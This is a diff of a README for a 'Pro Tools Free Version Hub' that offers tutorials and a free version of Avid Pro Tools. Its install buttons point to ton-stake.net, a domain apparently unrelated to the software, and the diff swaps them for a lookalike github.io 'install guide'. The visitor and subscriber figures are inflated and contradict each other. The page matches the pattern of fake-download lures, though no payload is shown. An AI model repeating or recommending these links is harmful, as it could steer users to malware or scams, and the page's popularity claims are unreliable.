@@ -1,15 +1,18 @@
 # 🎧 Avid Pro Tools Free Version Hub  
 
-[<span style="background-color: #ff9f43; color: white; padding: 5px 10px; border-radius: 5px; box-shadow: 2px 2px 4px rgba(0,0,0,0.2);">Downloads: 20K+</span>] | [<span style="background-color: #6ab04c; color: white; padding: 5px 10px; border-radius: 5px; box-shadow: 2px 2px 4px rgba(0,0,0,0.2);">Subscribers: 8K+</span>] | [<span style="background-color: #3498db; color: white; padding: 5px 10px; border-radius: 5px; box-shadow: 2px 2px 4px rgba(0,0,0,0.2);">Last Updated: June 2025</span>]  
+![Visitors: 8K+](https://img.shields.io/badge/Visitors-8K+-ff9f43)  ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c)  ![Last Updated: June 2025](https://img.shields.io/badge/Last_Updated-June_2025-3498db)
+
 
 ![Pro Tools Banner](https://uploads.toolfarm.com/app/uploads/2025/06/17112110/avid_protools20256_blog.jpg)  
  
 
 **Description**: Dive into professional audio production with the **Avid Pro Tools Free Version Hub** in 2025! This repository offers comprehensive tutorials, sample projects, and resources for the 30-day free trial and Pro Tools First free version. Join our community with 20K+ downloads and 8K+ subscribers to elevate your sound engineering skills!  
 
-[![Install Pro Tools](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://protoolsfreeversionhub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
+ 
 
 ## 📋 Getting Started Guide  
 
@@ -33,9 +36,11 @@ Begin your Pro Tools journey with these detailed steps to access the free versio
 6. **Troubleshooting** ❓  
    If issues occur, disable your VPN, check your audio interface, or contact Avid support.  
 
-[![Install Pro Tools](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://protoolsfreeversionhub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
+
 
 ## 💡 Why Choose Pro Tools Free Version Hub  
 
@@ -46,9 +51,11 @@ Begin your Pro Tools journey with these detailed steps to access the free versio
 - 🌍 **Active Community**: Supported by 20K+ downloads and 8K+ subscribers.  
 - 📅 **2025 Updates**: Stay current with the latest Pro Tools features.  
 
-[![Install Pro Tools](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://protoolsfreeversionhub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
+ 
 
 ## 🎯 Usage Scenarios  
 
@@ -64,9 +71,7 @@ Begin your Pro Tools journey with these detailed steps to access the free versio
 - 🎧 **Live Mixing**: Practice with virtual soundboards.  
 - 📚 **Skill Building**: Learn from 8K+ subscriber contributions.  
 
-[![Install Pro Tools](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
 
----
 
 ## 🏆 Benefits  
 
